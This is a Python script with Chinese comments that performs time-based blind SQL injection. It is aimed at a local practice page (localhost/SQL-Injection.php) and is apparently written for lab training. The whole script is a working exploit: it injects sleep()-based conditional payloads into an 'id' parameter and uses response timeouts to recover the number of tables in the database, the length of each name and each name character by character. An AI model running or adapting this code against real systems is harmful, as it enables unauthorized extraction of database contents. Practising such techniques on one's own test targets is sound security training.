"""
时间盲注 - 表名爆破脚本
适用环境：本地 SQL-Injection.php 测试页面
判断依据：若条件为真则延时 2 秒，通过请求超时检测来判断
"""

import string
import requests
import sys

# 配置
TARGET_URL = "http://localhost/SQL-Injection.php"
TIMEOUT = 2                     # 正常请求超时时间（应小于 sleep 时间）
SLEEP_TIME = 2                  # 延时秒数（必须大于 TIMEOUT）
MAX_TABLES = 20                  # 最大表数
MAX_NAME_LENGTH = 30             # 表名最大长度

# 字符集：数字、大小写字母、下划线
CHARSET = string.digits + string.ascii_letters + '_'

def make_request(payload):
    """发送请求，若触发超时则返回 True，否则返回 False"""
    params = {'id': payload}
    try:
        requests.get(TARGET_URL, params=params, timeout=TIMEOUT)
        return False  # 未超时，条件为假
    except requests.exceptions.ReadTimeout:
        return True   # 超时，条件为真
    except requests.RequestException as e:
        print(f"[!] 请求异常: {e}")
        return False

def get_table_count():
    """爆破当前数据库中的表数量"""
    print("[*] 正在爆破表数量...")
    for cnt in range(1, MAX_TABLES + 1):
        payload = f"1' and if((select count(table_name) from information_schema.tables where table_schema=database()) = {cnt}, sleep({SLEEP_TIME}), 1) -- -"
        if make_request(payload):
            print(f"[+] 表数量: {cnt}")
            return cnt
    print("[-] 未找到表数量（可能超过 MAX_TABLES）")
    sys.exit(1)

def get_table_name_length(table_index):
    """爆破第 table_index 个表的表名长度（索引从0开始）"""
    for length in range(1, MAX_NAME_LENGTH + 1):
        payload = f"1' and if(length((select table_name from information_schema.tables where table_schema=database() limit {table_index},1)) = {length}, sleep({SLEEP_TIME}), 1) -- -"
        if make_request(payload):
            return length
    return 0

def get_table_name(table_index, length):
    """逐字符爆破第 table_index 个表的表名"""
    table_name = ""
    for pos in range(1, length + 1):
        found = False
        for ch in CHARSET:
            payload = f"1' and if(substr((select table_name from information_schema.tables where table_schema=database() limit {table_index},1), {pos},1) = '{ch}', sleep({SLEEP_TIME}), 1) -- -"
            if make_request(payload):
                table_name += ch
                print(f"[+] 表[{table_index}] 第 {pos} 位: {ch}")
                found = True
                break
        if not found:
            print(f"[-] 表[{table_index}] 第 {pos} 位未匹配到字符，置为 '?'")
            table_name += '?'
    return table_name

def main():
    print("=" * 60)
    print("时间盲注 - 表名爆破")
    print("=" * 60)

    # 1. 获取表数量
    table_count = get_table_count()

    # 2. 遍历每个表，爆破表名
    table_names = []
    for idx in range(table_count):
        print(f"\n[*] 正在爆破第 {idx} 个表...")
        length = get_table_name_length(idx)
        if length == 0:
            print(f"[-] 表[{idx}] 长度获取失败，跳过")
            table_names.append("?")
            continue
        print(f"[+] 表[{idx}] 长度: {length}")
        name = get_table_name(idx, length)
        table_names.append(name)
        print(f"[+] 表[{idx}] 名称: {name}")

    # 3. 输出所有表名
    print("\n" + "=" * 60)
    print("最终结果（所有表名）:")
    for idx, name in enumerate(table_names):
        print(f"表[{idx}]: {name}")
    print("=" * 60)

if __name__ == "__main__":
    main()